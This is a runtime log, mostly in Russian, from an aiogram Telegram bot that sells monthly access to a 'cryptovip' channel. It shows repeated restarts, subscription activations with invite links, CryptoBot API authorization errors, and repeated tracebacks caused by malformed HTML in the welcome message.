2026-05-13 20:54:47 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-13 20:54:47 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-13 20:54:47 | INFO     | __main__ | Бот запущен: @generatooooorrrrrrr_bot (id=7203775205)
2026-05-13 20:54:52 | INFO     | handlers.start | Пользователь 733970441 (volner7) запустил бота
2026-05-13 20:54:57 | WARNING  | utils.photo_cache | Файл не найден: assets/tariffs.jpg
2026-05-13 20:55:02 | WARNING  | utils.photo_cache | Файл не найден: assets/tariffs.jpg
2026-05-13 20:55:05 | WARNING  | utils.photo_cache | Файл не найден: assets/tariffs.jpg
2026-05-13 20:55:07 | WARNING  | utils.photo_cache | Файл не найден: assets/tariffs.jpg
2026-05-13 20:55:09 | WARNING  | utils.photo_cache | Файл не найден: assets/tariffs.jpg
2026-05-13 20:55:18 | WARNING  | utils.photo_cache | Файл не найден: assets/tariffs.jpg
2026-05-13 20:55:24 | WARNING  | utils.photo_cache | Файл не найден: assets/tariffs.jpg
2026-05-13 20:58:17 | INFO     | __main__ | Запуск бота...
2026-05-13 20:58:17 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-13 20:58:17 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-13 20:58:17 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-13 20:58:17 | INFO     | __main__ | Запуск polling...
2026-05-13 20:58:17 | INFO     | database.db | База данных инициализирована
2026-05-13 20:58:17 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-13 20:58:17 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-13 20:58:17 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-13 20:58:17 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-13 20:58:19 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAANOagNw...
2026-05-13 20:58:19 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-13 20:58:19 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-13 20:58:19 | INFO     | __main__ | Бот запущен: @generatooooorrrrrrr_bot (id=7203775205)
2026-05-13 20:58:29 | WARNING  | utils.photo_cache | Файл не найден: assets/tariffs.jpg
2026-05-13 20:59:34 | INFO     | __main__ | Запуск бота...
2026-05-13 20:59:34 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-13 20:59:34 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-13 20:59:34 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-13 20:59:34 | INFO     | __main__ | Запуск polling...
2026-05-13 20:59:34 | INFO     | database.db | База данных инициализирована
2026-05-13 20:59:34 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-13 20:59:34 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-13 20:59:34 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-13 20:59:34 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-13 20:59:36 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAANOagNw...
2026-05-13 20:59:36 | INFO     | utils.photo_cache | Кэширую file_id для assets/tariffs.jpg...
2026-05-13 20:59:38 | INFO     | utils.photo_cache | file_id закэширован для assets/tariffs.jpg: AgACAgIAAxkDAAPBagS8...
2026-05-13 20:59:38 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-13 20:59:38 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-13 20:59:38 | INFO     | __main__ | Бот запущен: @generatooooorrrrrrr_bot (id=7203775205)
2026-05-13 20:59:49 | INFO     | handlers.start | Пользователь 733970441 (volner7) запустил бота
2026-05-13 21:00:18 | INFO     | handlers.start | Пользователь 733970441 (volner7) запустил бота
2026-05-13 21:01:04 | INFO     | handlers.start | Пользователь 733970441 (volner7) запустил бота
2026-05-13 21:01:35 | INFO     | database.db | Подписка активирована: user_id=733970441, type=month
2026-05-13 21:01:35 | INFO     | utils.channel | Создана инвайт-ссылка: https://t.me/+OyMrJpZf4m45YzM6
2026-05-13 21:02:03 | INFO     | handlers.start | Пользователь 733970441 (volner7) запустил бота
2026-05-13 21:02:12 | INFO     | handlers.start | Пользователь 733970441 (volner7) запустил бота
2026-05-13 21:02:16 | INFO     | handlers.start | Пользователь 733970441 (volner7) запустил бота
2026-05-13 21:02:32 | INFO     | handlers.start | Пользователь 733970441 (volner7) запустил бота
2026-05-13 21:03:25 | INFO     | handlers.start | Пользователь 733970441 (volner7) запустил бота
2026-05-13 21:04:04 | INFO     | handlers.start | Пользователь 733970441 (volner7) запустил бота
2026-05-13 21:04:34 | ERROR    | payments.cryptobot | CryptoBot API error: {'ok': False, 'error': {'code': 401, 'name': 'UNAUTHORIZED'}}
2026-05-13 21:13:58 | INFO     | database.db | Подписка активирована: user_id=733970441, type=month
2026-05-13 21:13:58 | INFO     | utils.channel | Создана инвайт-ссылка: https://t.me/+Bra9Mk5qSEYyNTky
2026-05-13 21:14:01 | INFO     | handlers.start | Пользователь 733970441 (volner7) запустил бота
2026-05-13 21:14:15 | INFO     | handlers.start | Пользователь 733970441 (volner7) запустил бота
2026-05-13 21:14:49 | INFO     | handlers.start | Пользователь 733970441 (volner7) запустил бота
2026-05-13 21:14:55 | INFO     | handlers.start | Пользователь 733970441 (volner7) запустил бота
2026-05-13 21:15:01 | ERROR    | payments.cryptobot | CryptoBot API error: {'ok': False, 'error': {'code': 401, 'name': 'UNAUTHORIZED'}}
2026-05-13 21:20:18 | INFO     | __main__ | Запуск бота...
2026-05-13 21:20:18 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-13 21:20:18 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-13 21:20:18 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-13 21:20:18 | INFO     | __main__ | Запуск polling...
2026-05-13 21:20:18 | INFO     | database.db | База данных инициализирована
2026-05-13 21:20:18 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-13 21:20:18 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-13 21:20:18 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-13 21:20:18 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-13 21:20:21 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAANOagNw...
2026-05-13 21:20:21 | INFO     | utils.photo_cache | Кэширую file_id для assets/tariffs.jpg...
2026-05-13 21:20:22 | INFO     | utils.photo_cache | file_id закэширован для assets/tariffs.jpg: AgACAgIAAxkDAAPBagS8...
2026-05-13 21:20:22 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-13 21:20:22 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-13 21:20:22 | INFO     | __main__ | Бот запущен: @generatooooorrrrrrr_bot (id=7203775205)
2026-05-13 21:20:27 | INFO     | handlers.start | Пользователь 733970441 (volner7) запустил бота
2026-05-13 21:26:32 | INFO     | __main__ | Запуск бота...
2026-05-13 21:27:35 | INFO     | __main__ | Запуск бота...
2026-05-13 21:27:35 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-13 21:27:35 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-13 21:27:35 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-13 21:27:35 | INFO     | __main__ | Запуск polling...
2026-05-13 21:27:35 | INFO     | database.db | База данных инициализирована
2026-05-13 21:27:35 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-13 21:27:35 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-13 21:27:35 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-13 21:27:35 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-13 21:27:37 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAANOagNw...
2026-05-13 21:27:37 | INFO     | utils.photo_cache | Кэширую file_id для assets/tariffs.jpg...
2026-05-13 21:27:38 | INFO     | utils.photo_cache | file_id закэширован для assets/tariffs.jpg: AgACAgIAAxkDAAPBagS8...
2026-05-13 21:27:38 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-13 21:27:38 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-13 21:27:38 | INFO     | __main__ | Бот запущен: @generatooooorrrrrrr_bot (id=7203775205)
2026-05-13 21:27:38 | INFO     | handlers.start | Пользователь 733970441 (volner7) запустил бота
2026-05-13 21:29:48 | INFO     | __main__ | Запуск бота...
2026-05-13 21:29:48 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-13 21:29:48 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-13 21:29:48 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-13 21:29:48 | INFO     | __main__ | Запуск polling...
2026-05-13 21:29:48 | INFO     | database.db | База данных инициализирована
2026-05-13 21:29:48 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-13 21:29:48 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-13 21:29:48 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-13 21:29:48 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-13 21:29:49 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAANOagNw...
2026-05-13 21:29:49 | INFO     | utils.photo_cache | Кэширую file_id для assets/tariffs.jpg...
2026-05-13 21:29:50 | INFO     | utils.photo_cache | file_id закэширован для assets/tariffs.jpg: AgACAgIAAxkDAAPBagS8...
2026-05-13 21:29:50 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-13 21:29:50 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-13 21:29:50 | INFO     | __main__ | Бот запущен: @generatooooorrrrrrr_bot (id=7203775205)
2026-05-13 21:29:59 | INFO     | utils.photo_cache | Кэширую file_id для assets/payment.jpg...
2026-05-13 21:30:00 | INFO     | utils.photo_cache | file_id закэширован для assets/payment.jpg: AgACAgIAAxkDAAIBb2oE...
2026-05-13 21:30:48 | INFO     | __main__ | Запуск бота...
2026-05-13 21:30:48 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-13 21:30:48 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-13 21:30:48 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-13 21:30:48 | INFO     | __main__ | Запуск polling...
2026-05-13 21:30:48 | INFO     | database.db | База данных инициализирована
2026-05-13 21:30:48 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-13 21:30:48 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-13 21:30:48 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-13 21:30:48 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-13 21:30:50 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAANOagNw...
2026-05-13 21:30:50 | INFO     | utils.photo_cache | Кэширую file_id для assets/tariffs.jpg...
2026-05-13 21:30:51 | INFO     | utils.photo_cache | file_id закэширован для assets/tariffs.jpg: AgACAgIAAxkDAAPBagS8...
2026-05-13 21:30:51 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-13 21:30:51 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-13 21:30:51 | INFO     | __main__ | Бот запущен: @generatooooorrrrrrr_bot (id=7203775205)
2026-05-13 21:34:09 | INFO     | __main__ | Запуск бота...
2026-05-13 21:34:09 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-13 21:34:09 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-13 21:34:09 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-13 21:34:09 | INFO     | __main__ | Запуск polling...
2026-05-13 21:34:09 | INFO     | database.db | База данных инициализирована
2026-05-13 21:34:09 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-13 21:34:09 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-13 21:34:09 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-13 21:34:09 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-13 21:34:10 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAANOagNw...
2026-05-13 21:34:10 | INFO     | utils.photo_cache | Кэширую file_id для assets/tariffs.jpg...
2026-05-13 21:34:11 | INFO     | utils.photo_cache | file_id закэширован для assets/tariffs.jpg: AgACAgIAAxkDAAPBagS8...
2026-05-13 21:34:11 | INFO     | utils.photo_cache | Кэширую file_id для assets/payment.jpg...
2026-05-13 21:34:11 | INFO     | utils.photo_cache | file_id закэширован для assets/payment.jpg: AgACAgIAAxkDAAIBb2oE...
2026-05-13 21:34:11 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-13 21:34:11 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-13 21:34:11 | INFO     | __main__ | Бот запущен: @generatooooorrrrrrr_bot (id=7203775205)
2026-05-13 21:34:18 | INFO     | handlers.start | Пользователь 733970441 (volner7) запустил бота
2026-05-13 21:35:04 | INFO     | database.db | Подписка активирована: user_id=733970441, type=month
2026-05-13 21:35:04 | INFO     | utils.channel | Создана инвайт-ссылка: https://t.me/+K1mLjqMJX6IyNGZi
2026-05-14 18:40:08 | INFO     | __main__ | Запуск бота...
2026-05-14 18:40:08 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-14 18:40:08 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-14 18:40:08 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-14 18:40:08 | INFO     | __main__ | Запуск polling...
2026-05-14 18:40:08 | INFO     | database.db | База данных инициализирована
2026-05-14 18:40:08 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-14 18:40:08 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-14 18:40:08 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-14 18:40:08 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-14 18:40:14 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAAIBjmoF...
2026-05-14 18:40:14 | INFO     | utils.photo_cache | Кэширую file_id для assets/tariffs.jpg...
2026-05-14 18:40:16 | INFO     | utils.photo_cache | file_id закэширован для assets/tariffs.jpg: AgACAgIAAxkDAAIBj2oF...
2026-05-14 18:40:16 | INFO     | utils.photo_cache | Кэширую file_id для assets/payment.jpg...
2026-05-14 18:40:18 | INFO     | utils.photo_cache | file_id закэширован для assets/payment.jpg: AgACAgIAAxkDAAIBkWoF...
2026-05-14 18:40:18 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-14 18:40:18 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-14 18:40:18 | INFO     | __main__ | Бот запущен: @generatooooorrrrrrr_bot (id=7203775205)
2026-05-14 18:40:19 | INFO     | handlers.start | Пользователь 733970441 (volner7) запустил бота
2026-05-14 18:58:11 | ERROR    | aiogram.dispatcher | Failed to fetch updates - TelegramNetworkError: HTTP Client says - ServerDisconnectedError: Server disconnected
2026-05-14 18:58:11 | WARNING  | aiogram.dispatcher | Sleep for 1.000000 seconds and try again... (tryings = 0, bot id = 7203775205)
2026-05-14 20:14:48 | INFO     | __main__ | Запуск бота...
2026-05-14 20:14:48 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-14 20:14:48 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-14 20:14:48 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-14 20:14:48 | INFO     | __main__ | Запуск polling...
2026-05-14 20:14:48 | INFO     | database.db | База данных инициализирована
2026-05-14 20:14:48 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-14 20:14:48 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-14 20:14:48 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-14 20:14:48 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-14 20:14:49 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAAIBlGoG...
2026-05-14 20:14:49 | INFO     | utils.photo_cache | Кэширую file_id для assets/tariffs.jpg...
2026-05-14 20:14:52 | INFO     | utils.photo_cache | file_id закэширован для assets/tariffs.jpg: AgACAgIAAxkDAAIBj2oF...
2026-05-14 20:14:52 | INFO     | utils.photo_cache | Кэширую file_id для assets/payment.jpg...
2026-05-14 20:14:57 | INFO     | utils.photo_cache | file_id закэширован для assets/payment.jpg: AgACAgIAAxkDAAIBkWoF...
2026-05-14 20:14:57 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-14 20:14:57 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-14 20:14:57 | INFO     | __main__ | Бот запущен: @generatooooorrrrrrr_bot (id=7203775205)
2026-05-14 20:14:57 | INFO     | handlers.start | Пользователь 733970441 (volner7) запустил бота
2026-05-14 20:22:11 | INFO     | __main__ | Запуск бота...
2026-05-14 20:22:11 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-14 20:22:11 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-14 20:22:11 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-14 20:22:11 | INFO     | __main__ | Запуск polling...
2026-05-14 20:22:11 | INFO     | database.db | База данных инициализирована
2026-05-14 20:22:11 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-14 20:22:11 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-14 20:22:11 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-14 20:22:11 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-14 20:22:12 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAAIBmWoG...
2026-05-14 20:22:12 | INFO     | utils.photo_cache | Кэширую file_id для assets/tariffs.jpg...
2026-05-14 20:22:12 | INFO     | utils.photo_cache | file_id закэширован для assets/tariffs.jpg: AgACAgIAAxkDAAIBj2oF...
2026-05-14 20:22:12 | INFO     | utils.photo_cache | Кэширую file_id для assets/payment.jpg...
2026-05-14 20:22:13 | INFO     | utils.photo_cache | file_id закэширован для assets/payment.jpg: AgACAgIAAxkDAAIBkWoF...
2026-05-14 20:22:13 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-14 20:22:13 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-14 20:22:13 | INFO     | __main__ | Бот запущен: @generatooooorrrrrrr_bot (id=7203775205)
2026-05-14 20:22:38 | INFO     | handlers.start | Пользователь 733970441 (volner7) запустил бота
2026-05-14 20:27:35 | INFO     | __main__ | Запуск бота...
2026-05-14 20:27:35 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-14 20:27:35 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-14 20:27:35 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-14 20:27:35 | INFO     | __main__ | Запуск polling...
2026-05-14 20:27:35 | INFO     | database.db | База данных инициализирована
2026-05-14 20:27:35 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-14 20:27:35 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-14 20:27:35 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-14 20:27:35 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-14 20:27:36 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAAIBmWoG...
2026-05-14 20:27:36 | INFO     | utils.photo_cache | Кэширую file_id для assets/tariffs.jpg...
2026-05-14 20:27:37 | INFO     | utils.photo_cache | file_id закэширован для assets/tariffs.jpg: AgACAgIAAxkDAAIBj2oF...
2026-05-14 20:27:37 | INFO     | utils.photo_cache | Кэширую file_id для assets/payment.jpg...
2026-05-14 20:27:38 | INFO     | utils.photo_cache | file_id закэширован для assets/payment.jpg: AgACAgIAAxkDAAIBkWoF...
2026-05-14 20:27:38 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-14 20:27:38 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-14 20:27:38 | INFO     | __main__ | Бот запущен: @generatooooorrrrrrr_bot (id=7203775205)
2026-05-14 20:27:43 | ERROR    | aiogram.event | Cause exception while process update id=676578621 by bot id=7203775205
TelegramBadRequest: Telegram server says - Bad Request: can't parse entities: Unmatched end tag at byte offset 221, expected "</i>", found "</b>"
Traceback (most recent call last):
  File "C:\python310\lib\site-packages\aiogram\dispatcher\dispatcher.py", line 309, in _process_update
    response = await self.feed_update(bot, update, **kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\dispatcher.py", line 158, in feed_update
    response = await self.update.wrap_outer_middleware(
  File "C:\python310\lib\site-packages\aiogram\dispatcher\middlewares\error.py", line 25, in __call__
    return await handler(event, data)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\middlewares\user_context.py", line 49, in __call__
    return await handler(event, data)
  File "C:\python310\lib\site-packages\aiogram\fsm\middleware.py", line 42, in __call__
    return await handler(event, data)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\event\telegram.py", line 121, in trigger
    return await wrapped_inner(event, kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\event\handler.py", line 43, in call
    return await wrapped()
  File "C:\python310\lib\site-packages\aiogram\dispatcher\dispatcher.py", line 276, in _listen_update
    return await self.propagate_event(update_type=update_type, event=event, **kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 142, in propagate_event
    return await observer.wrap_outer_middleware(_wrapped, event=event, data=kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 137, in _wrapped
    return await self._propagate_event(
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 170, in _propagate_event
    response = await router.propagate_event(update_type=update_type, event=event, **kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 142, in propagate_event
    return await observer.wrap_outer_middleware(_wrapped, event=event, data=kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 137, in _wrapped
    return await self._propagate_event(
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 162, in _propagate_event
    response = await observer.trigger(event, **kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\event\telegram.py", line 121, in trigger
    return await wrapped_inner(event, kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\event\handler.py", line 43, in call
    return await wrapped()
  File "C:\Users\Nikta\Desktop\bot\handlers\start.py", line 79, in cmd_start
    await send_welcome(bot, user.id)
  File "C:\Users\Nikta\Desktop\bot\handlers\start.py", line 37, in send_welcome
    msg = await bot.send_photo(
  File "C:\python310\lib\site-packages\aiogram\client\bot.py", line 2978, in send_photo
    return await self(call, request_timeout=request_timeout)
  File "C:\python310\lib\site-packages\aiogram\client\bot.py", line 485, in __call__
    return await self.session(self, method, timeout=request_timeout)
  File "C:\python310\lib\site-packages\aiogram\client\session\base.py", line 254, in __call__
    return cast(TelegramType, await middleware(bot, method))
  File "C:\python310\lib\site-packages\aiogram\client\session\aiohttp.py", line 189, in make_request
    response = self.check_response(
  File "C:\python310\lib\site-packages\aiogram\client\session\base.py", line 120, in check_response
    raise TelegramBadRequest(method=method, message=description)
aiogram.exceptions.TelegramBadRequest: Telegram server says - Bad Request: can't parse entities: Unmatched end tag at byte offset 221, expected "</i>", found "</b>"
2026-05-14 20:27:46 | ERROR    | aiogram.event | Cause exception while process update id=676578622 by bot id=7203775205
TelegramBadRequest: Telegram server says - Bad Request: can't parse entities: Unmatched end tag at byte offset 221, expected "</i>", found "</b>"
Traceback (most recent call last):
  File "C:\python310\lib\site-packages\aiogram\dispatcher\dispatcher.py", line 309, in _process_update
    response = await self.feed_update(bot, update, **kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\dispatcher.py", line 158, in feed_update
    response = await self.update.wrap_outer_middleware(
  File "C:\python310\lib\site-packages\aiogram\dispatcher\middlewares\error.py", line 25, in __call__
    return await handler(event, data)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\middlewares\user_context.py", line 49, in __call__
    return await handler(event, data)
  File "C:\python310\lib\site-packages\aiogram\fsm\middleware.py", line 42, in __call__
    return await handler(event, data)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\event\telegram.py", line 121, in trigger
    return await wrapped_inner(event, kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\event\handler.py", line 43, in call
    return await wrapped()
  File "C:\python310\lib\site-packages\aiogram\dispatcher\dispatcher.py", line 276, in _listen_update
    return await self.propagate_event(update_type=update_type, event=event, **kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 142, in propagate_event
    return await observer.wrap_outer_middleware(_wrapped, event=event, data=kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 137, in _wrapped
    return await self._propagate_event(
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 170, in _propagate_event
    response = await router.propagate_event(update_type=update_type, event=event, **kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 142, in propagate_event
    return await observer.wrap_outer_middleware(_wrapped, event=event, data=kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 137, in _wrapped
    return await self._propagate_event(
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 162, in _propagate_event
    response = await observer.trigger(event, **kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\event\telegram.py", line 121, in trigger
    return await wrapped_inner(event, kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\event\handler.py", line 43, in call
    return await wrapped()
  File "C:\Users\Nikta\Desktop\bot\handlers\start.py", line 79, in cmd_start
    await send_welcome(bot, user.id)
  File "C:\Users\Nikta\Desktop\bot\handlers\start.py", line 37, in send_welcome
    msg = await bot.send_photo(
  File "C:\python310\lib\site-packages\aiogram\client\bot.py", line 2978, in send_photo
    return await self(call, request_timeout=request_timeout)
  File "C:\python310\lib\site-packages\aiogram\client\bot.py", line 485, in __call__
    return await self.session(self, method, timeout=request_timeout)
  File "C:\python310\lib\site-packages\aiogram\client\session\base.py", line 254, in __call__
    return cast(TelegramType, await middleware(bot, method))
  File "C:\python310\lib\site-packages\aiogram\client\session\aiohttp.py", line 189, in make_request
    response = self.check_response(
  File "C:\python310\lib\site-packages\aiogram\client\session\base.py", line 120, in check_response
    raise TelegramBadRequest(method=method, message=description)
aiogram.exceptions.TelegramBadRequest: Telegram server says - Bad Request: can't parse entities: Unmatched end tag at byte offset 221, expected "</i>", found "</b>"
2026-05-14 20:27:48 | ERROR    | aiogram.event | Cause exception while process update id=676578623 by bot id=7203775205
TelegramBadRequest: Telegram server says - Bad Request: can't parse entities: Unmatched end tag at byte offset 221, expected "</i>", found "</b>"
Traceback (most recent call last):
  File "C:\python310\lib\site-packages\aiogram\dispatcher\dispatcher.py", line 309, in _process_update
    response = await self.feed_update(bot, update, **kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\dispatcher.py", line 158, in feed_update
    response = await self.update.wrap_outer_middleware(
  File "C:\python310\lib\site-packages\aiogram\dispatcher\middlewares\error.py", line 25, in __call__
    return await handler(event, data)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\middlewares\user_context.py", line 49, in __call__
    return await handler(event, data)
  File "C:\python310\lib\site-packages\aiogram\fsm\middleware.py", line 42, in __call__
    return await handler(event, data)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\event\telegram.py", line 121, in trigger
    return await wrapped_inner(event, kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\event\handler.py", line 43, in call
    return await wrapped()
  File "C:\python310\lib\site-packages\aiogram\dispatcher\dispatcher.py", line 276, in _listen_update
    return await self.propagate_event(update_type=update_type, event=event, **kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 142, in propagate_event
